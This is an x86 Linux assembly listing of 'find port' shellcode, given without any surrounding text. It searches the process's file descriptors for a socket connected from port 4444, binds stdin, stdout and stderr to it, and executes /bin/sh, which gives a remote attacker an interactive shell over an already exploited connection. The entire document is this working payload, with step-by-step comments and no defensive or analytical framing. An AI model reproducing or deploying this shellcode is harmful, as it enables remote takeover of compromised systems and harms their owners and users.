global _start
section .text
_start:
    xor     ebx,ebx
 
    ;int getpeername(int sockfd, struct sockaddr *addr, 
    ;   socklen_t *addrlen);
    push    ebx            ; null
    mov     edi,esp                 
    push    byte +0x10     ; addrlen
    push    esp
    push    edi            ; addr
    push    ebx            ; sockfd
    mov     ecx,esp        ; pointer to args
    mov     bl,0x7         ; getpeername()
LBL1:                      ; no, search for port
    inc     dword [ecx]    ; ++counter, (port number)
    push    byte +0x66     ; socketcall()
    pop     eax                 
    int     0x80           ; make the call
    cmp     word [edi+0x2],0x5c11   ; port 4444
    jnz     LBL1           ; found port?    
 
    ;int dup2(int oldfd, int newfd);
    pop     ebx            ; yes, found it
    push    byte +0x2      ; counter
    pop     ecx
LBL2:                      ; no, bind stdin/out/err
    mov     al,0x3f        ; dup2()
    int     0x80           ; make the call
    dec     ecx            ; --counter
    jns     LBL2           ; zero?
 
    ;int execve(const char *filename, char *const argv[],
    ;    char *const envp[]);
    push    eax            ; yes, null
    push    dword 0x68732f2f  ; hs//
    push    dword 0x6e69622f  ; nib/
    mov     ebx,esp        ; ebx, contains addr of //bin/sh
    push    eax            ; null
    push    ebx            ; pointer to //bin/sh
    mov     ecx,esp        ; ecx, contains addr of //bin/sh
    cdq
    mov     al,0xb         ; execve()
    int     0x80           ; make the call
